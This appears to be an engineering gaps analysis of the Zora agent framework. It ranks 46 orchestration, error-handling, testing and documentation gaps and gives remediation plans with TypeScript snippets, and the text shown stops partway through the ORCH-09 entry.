# Zora Agent Framework - Comprehensive Gaps Analysis

## Phase 1: Foundation

---

## 1. Executive Summary

### Overall Health Score: 4/10

**Assessment:** The Zora agent framework has strong foundational components but critical orchestration gaps prevent production deployment. Core providers, storage, and utilities are robust; however, the orchestration layer that integrates these components is incomplete.

### Gap Distribution: 46 Total Gaps

| Severity | Count | Risk Level | Impact |
|----------|-------|-----------|--------|
| **S1 (Critical)** | 6 | Blocks deployment | Core orchestration missing |
| **S2 (High)** | 12 | Prevents operation | Integrated features unavailable |
| **S3 (Medium)** | 22 | Degrades quality | Technical debt accumulation |
| **S4 (Low)** | 6 | Minor issues | Code clarity/performance |

### Effort Breakdown by Priority

#### P0 - Critical Path (~16 hours)
**Must complete before any production use:**
- ORCH-10: No Main Orchestrator Bootstrapping [3h] - *Foundation*
- ORCH-01: FailoverController Never Invoked [2h]
- ORCH-02: RetryQueue Consumer Missing [2h]
- ORCH-06: SessionManager Events Never Persisted [1h]
- ORCH-03: Router Not Integrated [2h]
- ERR-01: AuditLogger Silent Write Failures [1h]
- ERR-02: GeminiProvider Silent JSON Parse Failures [1h]
- ORCH-04: AuthMonitor Never Scheduled [1h]
- ORCH-07: MemoryManager Context Not Injected [1h]
- ORCH-09: HeartbeatSystem & RoutineManager Never Started [1h]

#### P1 - Integration Layer (~14 hours)
**Required for operational tooling:**
- TEST-01: No Integration Tests for Orchestration [4h]
- OPS-01: CLI Daemon Commands Are Stubs [3h]
- OPS-02: Dashboard `GET /api/jobs` Returns Empty Placeholder [2h]
- OPS-03: No Frontend Build Output [1h]
- TEST-02: No Failover/Retry Scenario Tests [3h]
- OPS-04: GeminiProvider Unbounded Buffer [1h]

#### P2 - Technical Debt (~24 hours)
**Quality and maintainability improvements:**
- TYPE-01 to TYPE-08: Type safety gaps [14h cumulative]
- LOG-01 to LOG-04: Logging/observability [8h cumulative]
- DOC-01 to DOC-05: Documentation [10h cumulative]

### Parallelization Potential

**Wall-Clock Estimate with Concurrent Work:**
- Sequential effort: ~54 hours
- P0 critical path: 16 hours (minimum)
- With 3-4 concurrent agents on independent gaps:
  - ~16h P0 (must be sequential for dependencies)
  - ~8h P1 (2 agents in parallel: ops + testing)
  - ~12h P2 (2-3 agents on type/logging/docs)
  - **Total wall-clock: ~10.5 hours** (vs 54 sequential)

---

## 2. Quick Reference Matrix

**How to use this table:**
- Sort by **Severity** to prioritize critical fixes
- Filter by **Blocking?** = "Y" to identify dependency chains
- Use **Effort** to find quick wins or bundle related work
- Check **Files Affected** to assess blast radius

| Gap ID | Category | Title | Severity | Files | Impact | Effort | Blocking? | Status |
|--------|----------|-------|----------|-------|--------|--------|-----------|--------|
| ORCH-10 | Orchestration | No Main Orchestrator Bootstrapping | S1 | 3 | 5 | 3h | Y | Open |
| ORCH-01 | Orchestration | FailoverController Never Invoked | S1 | 2 | 5 | 2h | Y | Open |
| ORCH-02 | Orchestration | RetryQueue Consumer Missing | S1 | 2 | 5 | 2h | Y | Open |
| ORCH-06 | Orchestration | SessionManager Events Never Persisted | S1 | 1 | 5 | 1h | Y | Open |
| ERR-01 | Error Handling | AuditLogger Silent Write Failures | S1 | 1 | 5 | 1h | Y | Open |
| ERR-02 | Error Handling | GeminiProvider Silent JSON Parse Failures | S1 | 1 | 5 | 1h | Y | Open |
| ORCH-03 | Orchestration | Router Not Integrated | S2 | 2 | 5 | 2h | Y | Open |
| ORCH-04 | Orchestration | AuthMonitor Never Scheduled | S2 | 1 | 4 | 1h | Y | Open |
| ORCH-07 | Orchestration | MemoryManager Context Not Injected | S2 | 2 | 4 | 1h | Y | Open |
| ORCH-08 | Orchestration | SteeringManager Never Polled | S2 | 2 | 3 | 2h | N | Open |
| ORCH-09 | Orchestration | HeartbeatSystem & RoutineManager Never Started | S2 | 2 | 4 | 1h | Y | Open |
| TYPE-05 | Type Safety | Silent JSON.parse() Errors | S2 | 3 | 4 | 1h | N | Open |
| ERR-03 | Error Handling | FlagManager Silently Skips Corrupted Files | S2 | 1 | 4 | 1h | N | Open |
| ERR-04 | Error Handling | Fragile Error Classification via String Matching | S2 | 1 | 3 | 2h | N | Open |
| ERR-05 | Error Handling | No Timeout on Event Streams | S2 | 1 | 4 | 1h | N | Open |
| OPS-01 | Operational | CLI Daemon Commands Are Stubs | S2 | 2 | 4 | 3h | Y | Open |
| OPS-02 | Operational | Dashboard `GET /api/jobs` Returns Empty Placeholder | S2 | 1 | 4 | 2h | Y | Open |
| OPS-03 | Operational | No Frontend Build Output | S2 | 1 | 4 | 1h | Y | Open |
| OPS-04 | Operational | GeminiProvider Unbounded Buffer | S2 | 1 | 3 | 1h | N | Open |
| OPS-05 | Operational | No Structured Logging | S2 | 15 | 3 | 3h | N | Open |
| TEST-01 | Testing | No Integration Tests for Orchestration | S2 | 2 | 4 | 4h | Y | Open |
| TEST-02 | Testing | No Failover/Retry Scenario Tests | S2 | 2 | 4 | 3h | N | Open |
| TEST-03 | Testing | CLI Commands Lack Functional Tests | S2 | 1 | 3 | 3h | N | Open |
| TEST-04 | Testing | Dashboard Endpoints Untested | S2 | 2 | 3 | 3h | N | Open |
| TEST-05 | Testing | Provider Tool Parsing Never Validated | S2 | 3 | 4 | 2h | N | Open |
| TEST-06 | Testing | GeminiProvider `checkAuth()` Tests Missing | S2 | 1 | 3 | 1h | N | Open |
| TEST-07 | Testing | TelegramGateway User Allowlist Logic Untested | S2 | 1 | 3 | 2h | N | Open |
| ORCH-05 | Orchestration | Router Uses Naive Classification | S3 | 1 | 2 | 4h | N | Open |
| ORCH-11 | Orchestration | Round-Robin Mode Actually Random | S4 | 1 | 1 | 30min | N | Open |
| TYPE-01 | Type Safety | 36 `as any` Assertions in Providers | S3 | 3 | 2 | 3h | N | Open |
| TYPE-02 | Type Safety | `err: unknown` Not Properly Narrowed | S3 | 8 | 2 | 2h | N | Open |
| TYPE-03 | Type Safety | TaskContext History Type Is `any[]` | S3 | 2 | 2 | 4h | N | Open |
| TYPE-04 | Type Safety | ProviderConfig Missing Type Hierarchy | S3 | 1 | 2 | 2h | N | Open |
| TYPE-06 | Type Safety | No Type Definitions for Event Payloads | S3 | 5 | 2 | 2h | N | Open |
| TYPE-07 | Type Safety | LLMProvider Union Types Underutilized | S3 | 1 | 2 | 2h | N | Open |
| TYPE-08 | Type Safety | Missing Return Type Annotations | S4 | 20 | 1 | 1h | N | Open |
| ERR-06 | Error Handling | Command Parsing Regex Incomplete | S3 | 1 | 3 | 2h | N | Open |
| LOG-01 | Logging & Observability | Console.log Used Throughout | S3 | 15 | 2 | 3h | N | Open |
| LOG-02 | Logging & Observability | Silent Errors in Async Operations | S2 | 10 | 3 | 2h | N | Open |
| LOG-03 | Logging & Observability | No Health Check Instrumentation | S2 | 1 | 3 | 2h | N | Open |
| LOG-04 | Logging & Observability | Event Stream Lack Source Attribution | S3 | 5 | 2 | 1h | N | Open |
| DOC-01 | Documentation | Sparse Inline Explanations in Complex Modules | S3 | 5 | 2 | 2h | N | Open |
| DOC-02 | Documentation | No Architecture Decision Records (ADRs) | S3 | 1 | 2 | 3h | N | Open |
| DOC-03 | Documentation | Provider Implementation Guide Missing | S3 | 1 | 2 | 2h | N | Open |
| DOC-04 | Documentation | Configuration Reference Incomplete | S3 | 1 | 2 | 1h | N | Open |
| DOC-05 | Documentation | No Troubleshooting Guide | S3 | 1 | 2 | 2h | N | Open |

### Legend
- **Severity:** S1=Critical (blocks deployment), S2=High (blocks features), S3=Medium (tech debt), S4=Low (minor)
- **Impact:** 1-5 scale, where 5 = production inoperable, 1 = cosmetic
- **Effort:** Time to resolve (30min, 1h, 2h, 4h, 8h, 8h+)
- **Blocking?:** Y = other gaps depend on this; N = independent
- **Files:** Approximate count of files affected

---

## 3. Critical Path & Dependency Chain

### Orchestration Dependency Tree

```
ORCH-10: Main Orchestrator Bootstrapping [3h]
│
├─── ORCH-01: FailoverController Invocation [2h]
│    └─── ERR-04: Error Classification [2h]
│
├─── ORCH-02: RetryQueue Consumer [2h]
│
├─── ORCH-03: Router Integration [2h]
│    └─── ORCH-05: Router Classification [4h] (optional enhancement)
│
├─── ORCH-06: SessionManager Persistence [1h]
│    └─── ERR-01: AuditLogger Error Handling [1h]
│
├─── ORCH-07: MemoryManager Injection [1h]
│
├─── ORCH-04: AuthMonitor Scheduling [1h]
│
└─── ORCH-09: Service Startup [1h]
     └─── ERR-05: Event Stream Timeout [1h]
```

### Operational & Testing Dependencies

```
OPS-01: CLI Daemon Commands [3h]
├─ Requires: ORCH-10 (Orchestrator)
├─ Enables: OPS-02, OPS-03, TEST-01
│
OPS-02: Dashboard API /jobs [2h]
├─ Requires: ORCH-10, OPS-01
│
OPS-03: Frontend Build [1h]
├─ Requires: OPS-01 (blocking for full dashboard)
│
TEST-01: Integration Tests [4h]
├─ Requires: ORCH-10, OPS-01
├─ Unblocks: TEST-02, TEST-03
```

### Recommended Execution Order

#### Phase 1: Foundation (ORCH-10 + Quick Fixes) → ~6 hours wall-clock
1. **ORCH-10** [3h] - Core orchestrator bootstrap
2. **Parallel quick wins** [1h each]:
   - ORCH-06 + ERR-01 (Session persistence)
   - ORCH-04 (AuthMonitor)
   - ORCH-09 + ERR-05 (Service startup)
   - ERR-02 (GeminiProvider JSON)
   - ERR-03 (FlagManager logging)

#### Phase 2: Core Orchestration (Parallel) → ~2.5 hours wall-clock
1. **Agent A:** ORCH-01 + ERR-04 [2h] (Failover)
2. **Agent B:** ORCH-02 [2h] (Retry)
3. **Agent C:** ORCH-03 [2h] (Router)
4. **Agent D:** ORCH-07 [1h] (Memory injection)

#### Phase 3: Operational (Parallel) → ~3 hours wall-clock
1. **Agent A:** OPS-01 [3h] (Daemon start)
2. **Agent B:** OPS-03 [1h] (Frontend)
3. **Agent C:** TEST-01 [4h] (Integration tests)

**Total with optimal parallelization:** ~11.5 hours wall-clock

---

## 4. Quick Wins Strategy

**High-value, low-effort gaps to resolve first (S1/S2 with ≤1h effort):**

| Gap ID | Title | Effort | Impact | Notes |
|--------|-------|--------|--------|-------|
| ORCH-06 | SessionManager Events Persistence | 1h | Critical | Enables audit trail; blocks ORCH-10 completion |
| ORCH-04 | AuthMonitor Scheduling | 1h | High | Integrate existing monitor into main loop |
| ORCH-09 | Service Startup | 1h | High | Schedule heartbeat and routine manager |
| ERR-01 | AuditLogger Error Handling | 1h | Critical | Prevent silent audit failures |
| ERR-02 | GeminiProvider JSON Parsing | 1h | Critical | Handle malformed API responses |
| ERR-03 | FlagManager Logging | 1h | High | Add visibility to config loading |
| ERR-05 | Event Stream Timeout | 1h | High | Prevent hanging event consumers |
| OPS-03 | Frontend Build | 1h | High | Simple build process setup |

**Expected impact:** ~8 hours of work → 42% reduction in critical/blocking gaps

---

## 5. Gap Categories Overview

### Orchestration (11 gaps)
**Root cause:** Main orchestrator bootstrap absent; components built but not wired together

**Impact:** Framework cannot start or coordinate operations

**Dependencies:** Most gaps depend on ORCH-10 being resolved first

### Type Safety (8 gaps)
**Root cause:** TypeScript escape hatches (`as any`, `unknown`) used to bypass compile-time safety

**Impact:** Runtime errors not caught; refactoring risk; IDE assistance limited

**Dependencies:** None - can be addressed independently in parallel

### Error Handling (6 gaps)
**Root cause:** Silent failures in critical paths; error classification fragile

**Impact:** Production issues difficult to diagnose; data loss possible (audit logs)

**Dependencies:** Some block orchestration; others independent

### Testing (7 gaps)
**Root cause:** Integration & scenario tests missing; focus on unit tests only

**Impact:** Cannot verify end-to-end flows work; gaps introduced during integration

**Dependencies:** TEST-01 blocks TEST-02, TEST-03; others independent

### Operational (5 gaps)
**Root cause:** CLI/Dashboard stubs never fully implemented; no frontend build

**Impact:** Cannot run as daemon; no operational visibility; frontend unusable

**Dependencies:** OPS-01 blocks OPS-02; TEST-01 depends on OPS-01

### Logging & Observability (4 gaps)
**Root cause:** Console.log scattered; no structured logging or tracing

**Impact:** Cannot diagnose production issues; no audit trail

**Dependencies:** None - parallel implementation possible

### Documentation (5 gaps)
**Root cause:** Complex modules lack explanation; no architecture decision records

**Impact:** Onboarding difficult; tribal knowledge; maintainability risk

**Dependencies:** None - can be authored independently

---

## 6. ORCHESTRATION GAPS (11 gaps)

The orchestration layer represents the framework's integration backbone. Sophisticated individual components (FailoverController, RetryQueue, AuthMonitor, SessionManager, Router) exist but are never invoked because no central orchestrator bootstraps and coordinates them. This section details each gap with remediation strategies.

---

### ORCH-01: FailoverController Never Invoked
**Severity:** S1 | **Functionality Impact:** 5 | **Reliability:** 5 | **Security:** 3
**Effort:** 2h | **Blocking:** Y | **Status:** Open

#### Description
The FailoverController component exists to handle provider failover when quota limits are reached or authentication fails, but ExecutionLoop never invokes its `handleFailure()` method. When transient errors occur (e.g., Claude API rate limit, auth token expiry), tasks fail permanently instead of automatically switching to an alternative provider. This means users experience total service unavailability for recoverable failures.

#### Current State
- **Location:** `/home/user/zora/src/orchestration/execution-loop.ts:85-120` (error handling block)
- **Code Snippet:**
```typescript
// Current: No failover call
catch (error) {
  logger.error(`Task execution failed: ${error.message}`);
  // Error is logged but nothing handles provider switching
  // FailoverController.handleFailure() is never called
  // Task marked as failed permanently
  state.currentTaskState = 'failed';
}
```
- **Related Gaps:** ERR-04 (Error Classification), ORCH-10 (Main Orchestrator)

#### Expected State
When ExecutionLoop catches provider-specific errors (quota, auth, timeout), it delegates to FailoverController which:
1. Classifies the error as recoverable or permanent
2. If recoverable: marks current provider as degraded, selects alternate provider, re-submits task
3. If permanent: routes to error handling, notifies user
4. Logs failover attempt with provider name and reason

#### Why It Matters
Transient provider failures are the most common operational issue (rate limits reset hourly, tokens refresh automatically). Without failover, users lose access to the agent during these windows, creating false reports of system unavailability. Teams cannot rely on the framework for mission-critical tasks.

#### Remediation Approach
**Strategy:** Integrate FailoverController into ExecutionLoop's error handler. When ExecutionLoop catches provider-specific errors, call FailoverController.handleFailure() with the error context and current provider. FailoverController returns either an alternative provider for retry or a permanent failure signal.

**Affected Files:**
- `/home/user/zora/src/orchestration/execution-loop.ts` — Add FailoverController.handleFailure() call in catch block
- `/home/user/zora/src/orchestration/failover-controller.ts` — Ensure handleFailure() returns retry signal with new provider

**Dependencies:** ORCH-10 (FailoverController must be instantiated in main orchestrator)

**Test Coverage:**
- Simulate quota error → verify FailoverController switches provider → verify task re-submitted
- Simulate auth error → verify alternative provider used
- Simulate non-recoverable error → verify task marked failed, no retry

**Definition of Done:**
- [ ] ExecutionLoop catches provider errors and calls FailoverController.handleFailure()
- [ ] FailoverController successfully switches provider on quota/auth errors
- [ ] Retry logic re-submits task to new provider with exponential backoff
- [ ] Integration test verifies failover flow end-to-end

---

### ORCH-02: RetryQueue Consumer Missing
**Severity:** S1 | **Functionality Impact:** 5 | **Reliability:** 4 | **Security:** 1
**Effort:** 2h | **Blocking:** Y | **Status:** Open

#### Description
RetryQueue is a queue data structure for failed tasks awaiting retry, but nothing consumes it. When tasks are enqueued for retry, they remain in the queue indefinitely unless manually removed. Users must manually re-submit failed tasks or restart the agent; automatic recovery is unavailable.

#### Current State
- **Location:** `/home/user/zora/src/orchestration/retry-queue.ts:1-50` (queue definition)
- **Code Snippet:**
```typescript
// RetryQueue exists but is never polled
export class RetryQueue {
  private queue: RetryTask[] = [];

  getReadyTasks(): RetryTask[] {
    return this.queue.filter(t => t.retryAfter <= Date.now());
  }

  enqueue(task: Task, reason: string): void {
    this.queue.push({ task, retryAfter: Date.now() + 5000, reason });
  }
}

// But in ExecutionLoop: no call to retryQueue.getReadyTasks()
```
- **Related Gaps:** ORCH-10 (Main Orchestrator), ORCH-01 (Failover)

#### Expected State
ExecutionLoop (or a service spawned by Orchestrator) polls RetryQueue every 5 seconds via `getReadyTasks()`. For each ready task, it:
1. Retrieves retry metadata (reason, attempt count, last provider used)
2. Selects a provider (same or different based on failure reason)
3. Re-submits task to ExecutionLoop
4. Tracks retry metrics (attempt #, success/failure)

#### Why It Matters
Retry logic is the primary defense against transient failures. Without automatic retry consumption, tasks fail once and are lost. Users cannot rely on the framework for mission-critical workloads (e.g., "run this analysis, retry on failure").

#### Remediation Approach
**Strategy:** Create a RetryQueueConsumer service that polls RetryQueue in a background loop (every 5 seconds). When ready tasks are found, Consumer resubmits them to ExecutionLoop, tracking attempt counts and provider selection. Orchestrator.boot() starts this service.

**Affected Files:**
- `/home/user/zora/src/orchestration/retry-queue-consumer.ts` — New service, polling loop
- `/home/user/zora/src/orchestration/execution-loop.ts` — Accept re-submitted tasks from Consumer
- `/home/user/zora/src/orchestration/orchestrator.ts` — Instantiate and start RetryQueueConsumer

**Dependencies:** ORCH-10 (Orchestrator must instantiate Consumer)

**Test Coverage:**
- Enqueue failed task → wait 6s → verify Consumer re-submits to ExecutionLoop
- Verify retry attempt counter incremented
- Verify exponential backoff applied (1st retry: 5s, 2nd: 10s, 3rd: 20s, max 5 attempts)
- Verify task removed from queue after max retries

**Definition of Done:**
- [ ] RetryQueueConsumer polls queue every 5 seconds
- [ ] Ready tasks automatically re-submitted to ExecutionLoop
- [ ] Retry metadata tracked (attempt #, provider, reason)
- [ ] Tasks removed from queue after max retries (5)
- [ ] Integration test verifies automatic retry flow

---

### ORCH-03: Router Not Integrated into ExecutionLoop
**Severity:** S2 | **Functionality Impact:** 5 | **Reliability:** 2 | **Security:** 1
**Effort:** 2h | **Blocking:** Y | **Status:** Open

#### Description
Router is a component that selects between multiple providers (Claude, Ollama, Gemini) based on task characteristics. However, ExecutionLoop hardcodes the Claude SDK and never calls Router.selectProvider(). The framework currently works only with Claude; users cannot leverage alternative providers even if configured.

#### Current State
- **Location:** `/home/user/zora/src/orchestration/execution-loop.ts:30-50` (provider selection)
- **Code Snippet:**
```typescript
// Current: Hardcoded Claude
async executeTask(task: Task): Promise<TaskResult> {
  const provider = new ClaudeProvider(this.config.claude);
  // Never calls Router.selectProvider()
  // Alternative providers (Ollama, Gemini) are unreachable
  return provider.execute(task);
}
```
- **Related Gaps:** ORCH-10 (Main Orchestrator), ORCH-05 (Router Classification Logic)

#### Expected State
ExecutionLoop calls Router.selectProvider(task) which analyzes task properties and returns the best provider. For simple tasks, Ollama is used (local, fast). For reasoning tasks, Claude is used. For multi-language tasks, Gemini is used. ExecutionLoop uses returned provider to execute task.

#### Why It Matters
Multi-provider support enables cost optimization (Ollama for simple tasks, Claude for complex), resilience (if Claude is down, Ollama handles requests), and workload-specific tuning (language model for text, code model for programming). Without this integration, the framework is locked to a single provider.

#### Remediation Approach
**Strategy:** Replace hardcoded provider instantiation in ExecutionLoop with Router.selectProvider(task). Router analyzes task type/description and returns provider instance. ExecutionLoop uses returned provider transparently (via LLMProvider interface).

**Affected Files:**
- `/home/user/zora/src/orchestration/execution-loop.ts` — Replace hardcoded ClaudeProvider with Router.selectProvider()
- `/home/user/zora/src/orchestration/router.ts` — Ensure selectProvider() returns LLMProvider instance

**Dependencies:** ORCH-10 (Router must be instantiated in Orchestrator)

**Test Coverage:**
- Simple task (≤100 tokens) → verify Ollama selected
- Complex reasoning task → verify Claude selected
- Multi-language task → verify Gemini selected
- Verify selected provider.execute() called
- Verify provider-specific errors propagate to FailoverController

**Definition of Done:**
- [ ] ExecutionLoop calls Router.selectProvider() for all tasks
- [ ] Correct provider selected based on task type
- [ ] All provider types (Claude, Ollama, Gemini) executable from ExecutionLoop
- [ ] Integration test verifies provider selection flow

---

### ORCH-04: AuthMonitor Never Scheduled
**Severity:** S2 | **Functionality Impact:** 4 | **Reliability:** 4 | **Security:** 3
**Effort:** 1h | **Blocking:** Y | **Status:** Open

#### Description
AuthMonitor is a service that proactively detects token expiry and credential issues before they cause task failures. However, no `setInterval()` is called in Orchestrator, so AuthMonitor never runs. Token expiration is only discovered when the next task fails, causing delays and poor user experience.

#### Current State
- **Location:** `/home/user/zora/src/orchestration/orchestrator.ts:50-80` (boot method)
- **Code Snippet:**
```typescript
// Current: No AuthMonitor scheduling
async boot(): Promise<void> {
  // ... other initialization
  // Missing: this.authMonitor.start(this.config.authCheckInterval || 60000)
  // Token expiry detected only on next task failure
}
```
- **Related Gaps:** ORCH-10 (Main Orchestrator), ORCH-09 (Service Startup)

#### Expected State
Orchestrator.boot() calls authMonitor.start() which schedules periodic checks (every 60 seconds by default). AuthMonitor verifies all configured provider credentials, logs warnings 24 hours before expiry, and pre-refreshes tokens when possible.

#### Why It Matters
Token expiry is predictable; detecting it proactively prevents cascading failures. Users see proactive warnings ("Claude token expires in 23 hours") instead of "authentication failed" errors during task execution. Production stability improves significantly.

#### Remediation Approach
**Strategy:** In Orchestrator.boot(), instantiate AuthMonitor and call its start() method with check interval config (default 60s). AuthMonitor periodically calls each provider's checkAuth() method, logs results, and stores last-check metadata for monitoring.

**Affected Files:**
- `/home/user/zora/src/orchestration/orchestrator.ts` — Add authMonitor.start() in boot()
- `/home/user/zora/src/orchestration/auth-monitor.ts` — Ensure start() schedules periodic checks

**Dependencies:** ORCH-10 (AuthMonitor must be instantiated in Orchestrator)

**Test Coverage:**
- Verify AuthMonitor.start() schedules checks every 60s (configurable)
- Mock provider auth check → verify AuthMonitor calls it periodically
- Verify token expiry warning logged 24h before expiry
- Verify healthy credentials logged at INFO level

**Definition of Done:**
- [ ] AuthMonitor.start() called in Orchestrator.boot()
- [ ] Periodic auth checks scheduled every 60 seconds
- [ ] Token expiry warnings generated 24 hours in advance
- [ ] Check results logged for observability

---

### ORCH-05: Router Uses Naive Classification
**Severity:** S3 | **Functionality Impact:** 2 | **Reliability:** 2 | **Security:** 1
**Effort:** 4h | **Blocking:** N | **Status:** Open

#### Description
Router's selectProvider() uses simple keyword matching (text.includes('code') → coding provider) to classify tasks. This is unreliable for nuanced tasks. A request like "Analyze how this code performs" incorrectly selects the coding provider when Claude is more suitable.

#### Current State
- **Location:** `/home/user/zora/src/orchestration/router.ts:40-70` (classification logic)
- **Code Snippet:**
```typescript
// Current: Naive keyword matching
selectProvider(task: Task): LLMProvider {
  const desc = task.description.toLowerCase();
  if (desc.includes('code') || desc.includes('programming')) {
    return this.codingProvider; // Naive heuristic
  }
  if (desc.includes('translate') || desc.includes('language')) {
    return this.multilingualProvider;
  }
  return this.defaultProvider; // Claude
}
```
- **Related Gaps:** ORCH-03 (Router Integration)

#### Expected State
Router uses multi-factor classification: task token count, keyword detection, linguistic analysis (NLP), and user-provided hints. Complex analysis tasks use Claude even if they mention "code". Simple code snippets use Ollama.

#### Why It Matters
Incorrect provider selection degrades performance (using expensive Claude for simple tasks) and user experience (slow response times). This gap is medium priority because ORCH-03 integration is more critical; but once Router is integrated, better classification yields immediate ROI.

#### Remediation Approach
**Strategy:** Enhance Router.selectProvider() with multi-factor classification: (1) if task.preferredProvider set, use it; (2) if token count < 1000, use Ollama; (3) if contains reasoning keywords ("analyze", "explain", "design"), use Claude; (4) if multilingual keywords or translation, use Gemini; (5) fallback to Claude.

**Affected Files:**
- `/home/user/zora/src/orchestration/router.ts` — Enhance selectProvider() with multi-factor logic

**Dependencies:** None - can be implemented independently; but only valuable after ORCH-03 is done

**Test Coverage:**
- "Analyze code performance" → verify Claude selected (not coding provider)
- "Translate to Spanish" → verify Gemini selected
- 50-token code snippet → verify Ollama selected
- User-provided preferredProvider → verify honored

**Definition of Done:**
- [ ] Router.selectProvider() uses multi-factor classification
- [ ] Token count heuristic implemented (threshold: 1000)
- [ ] Reasoning keyword detection added
- [ ] User preferences honored when specified
- [ ] Unit tests verify classification accuracy

---

### ORCH-06: SessionManager Events Never Persisted
**Severity:** S1 | **Functionality Impact:** 5 | **Reliability:** 4 | **Security:** 3
**Effort:** 1h | **Blocking:** Y | **Status:** Open

#### Description
SessionManager has an appendEvent() method for logging task execution events (task_started, task_completed, provider_switched, etc.), but ExecutionLoop never calls it. No audit trail exists. Cannot resume failed tasks, cannot trace execution history, and the dashboard shows no historical data. This is both a usability and compliance issue.

#### Current State
- **Location:** `/home/user/zora/src/orchestration/execution-loop.ts:85-120` (event yield locations)
- **Code Snippet:**
```typescript
// Current: Events are yielded but never persisted
async *executeTask(task: Task): AsyncGenerator<TaskEvent> {
  yield { type: 'task_started', timestamp: Date.now() };
  // ... execution logic
  yield { type: 'task_completed', result: taskResult };
  // SessionManager.appendEvent() never called
  // Events exist in memory only, not persisted
}
```
- **Related Gaps:** ORCH-10 (Main Orchestrator), ERR-01 (AuditLogger Error Handling)

#### Expected State
ExecutionLoop yields events as it does now. A service (invoked by Orchestrator) subscribes to these events and calls SessionManager.appendEvent() for each. SessionManager persists events to storage (file or database) with timestamp, task ID, event type, and context.

#### Why It Matters
Event history enables operational debugging ("what happened at 3:45 PM when the service failed?"), task resumption after failure, and audit compliance. Without this, production incidents are impossible to diagnose. The dashboard is also blind without event history.

#### Remediation Approach
**Strategy:** Create an EventPersistenceService that listens to ExecutionLoop event stream and persists each event via SessionManager.appendEvent(). Orchestrator instantiates this service in boot(). SessionManager stores events in persistent storage with proper error handling (see ERR-01).

**Affected Files:**
- `/home/user/zora/src/orchestration/event-persistence-service.ts` — New service, subscribes to events
- `/home/user/zora/src/orchestration/execution-loop.ts` — Ensure events are published/yielded
- `/home/user/zora/src/orchestration/orchestrator.ts` — Instantiate and start EventPersistenceService

**Dependencies:** ORCH-10 (Orchestrator instantiation), ERR-01 (AuditLogger error handling)

**Test Coverage:**
- Yield task_started event → verify SessionManager.appendEvent() called
- Verify event persisted with timestamp and task context
- Verify failed persistence logged but doesn't crash ExecutionLoop (see ERR-01)

**Definition of Done:**
- [ ] EventPersistenceService created and listens to ExecutionLoop events
- [ ] SessionManager.appendEvent() called for each event
- [ ] Events persisted to storage with full context
- [ ] Dashboard can query event history via SessionManager
- [ ] Integration test verifies event trail captured end-to-end

---

### ORCH-07: MemoryManager Context Not Injected Systematically
**Severity:** S2 | **Functionality Impact:** 4 | **Reliability:** 4 | **Security:** 2
**Effort:** 1h | **Blocking:** Y | **Status:** Open

#### Description
MemoryManager loads task context from memory (previous related tasks, conversation history) but only the `ask` command manually calls MemoryManager.loadContext(). Routine tasks and retried tasks lose historical context. Each task starts with empty history instead of inheriting conversation thread.

#### Current State
- **Location:** `/home/user/zora/src/commands/ask.ts:30-50` (manual memory loading)
- **Code Snippet:**
```typescript
// Manual call in ask command only
export async function ask(prompt: string): Promise<void> {
  const context = await memoryManager.loadContext(prompt); // Only here!
  const task = { prompt, context };
  // ... execute
}

// But in ExecutionLoop: no context loading
async executeTask(task: Task): Promise<TaskResult> {
  // task.context is undefined for routine/retry tasks
  // Historical context lost
}
```
- **Related Gaps:** ORCH-10 (Main Orchestrator), ORCH-02 (Retry Queue)

#### Expected State
ExecutionLoop (or a middleware layer) automatically calls MemoryManager.loadContext(task) before submitting to provider. Context includes previous messages in the conversation thread, related task results, and session state. Retried and routine tasks inherit context.

#### Why It Matters
Context is essential for multi-turn conversations and related task chains. Without it, each task is isolated; the agent cannot build on previous analysis or remember user preferences set in earlier tasks. This degrades the conversational experience significantly.

#### Remediation Approach
**Strategy:** Create a ContextInjectionMiddleware in ExecutionLoop that loads context via MemoryManager before calling provider.execute(). Middleware checks if task.context exists; if not, loads it. For routine/retry tasks, automatically load context based on task type and user.

**Affected Files:**
- `/home/user/zora/src/orchestration/execution-loop.ts` — Add context loading middleware before provider.execute()
- `/home/user/zora/src/orchestration/memory-manager.ts` — Ensure loadContext() handles all task types

**Dependencies:** ORCH-10 (Orchestrator instantiation)

**Test Coverage:**
- Submit task without explicit context → verify MemoryManager loads context
- Verify context includes previous related tasks
- Verify retry task inherits conversation history
- Verify routine task maintains user preferences from context

**Definition of Done:**
- [ ] MemoryManager.loadContext() called for all tasks in ExecutionLoop
- [ ] Context includes conversation history and related tasks
- [ ] Retry and routine tasks inherit context systematically
- [ ] Integration test verifies multi-turn conversation flow

---

### ORCH-08: SteeringManager Never Polled During Execution
**Severity:** S2 | **Functionality Impact:** 3 | **Reliability:** 3 | **Security:** 1
**Effort:** 2h | **Blocking:** N | **Status:** Open

#### Description
SteeringManager allows users to send mid-task steering messages (e.g., "switch to Ollama", "increase depth", "summarize results"). However, ExecutionLoop never polls SteeringManager during task execution. Steering messages are stored but ignored; the task proceeds unaffected.

#### Current State
- **Location:** `/home/user/zora/src/orchestration/execution-loop.ts:100-150` (execution loop)
- **Code Snippet:**
```typescript
// Current: No steering poll
async executeTask(task: Task): Promise<TaskResult> {
  while (!task.completed) {
    // Long-running task...
    // User sends: "switch to Ollama" → SteeringManager receives it
    // But ExecutionLoop never checks for steering messages
    // Task continues with original provider
  }
}
```
- **Related Gaps:** ORCH-10 (Main Orchestrator)

#### Expected State
ExecutionLoop periodically polls SteeringManager.getSteeringMessages(taskId) during execution. If steering messages exist, ExecutionLoop applies them (e.g., provider switch, depth adjustment, resource limits). Users see immediate effect of their steering commands.

#### Why It Matters
Real-time steering enables adaptive execution. If a task is taking too long, users can steer it to summary mode. If results are poor, users can switch providers mid-stream. This significantly improves user control and satisfaction, especially for long-running operations.

#### Remediation Approach
**Strategy:** In ExecutionLoop's main execution loop, add polling for steering messages every 2 seconds (configurable). If messages exist, apply them to task state (provider switch, parameters, output modes). Log applied steering for observability.

**Affected Files:**
- `/home/user/zora/src/orchestration/execution-loop.ts` — Add SteeringManager polling in main loop
- `/home/user/zora/src/orchestration/steering-manager.ts` — Ensure getSteeringMessages() and applySteeringMessage() methods exist

**Dependencies:** None - can be implemented independently; enhances ORCH-03

**Test Coverage:**
- Send "switch provider" steering message → verify provider switches
- Send "increase depth" message → verify depth parameter updated
- Verify steering applied within 3 seconds of submission
- Verify steering logged for audit trail

**Definition of Done:**
- [ ] ExecutionLoop polls SteeringManager every 2 seconds
- [ ] Steering messages applied to running task
- [ ] Provider switching works mid-execution
- [ ] Integration test verifies real-time steering

---

### ORCH-09: HeartbeatSystem & RoutineManager Never Started
**Severity:** S2 | **Functionality Impact:** 4 | **Reliability:** 4 | **Security:** 1
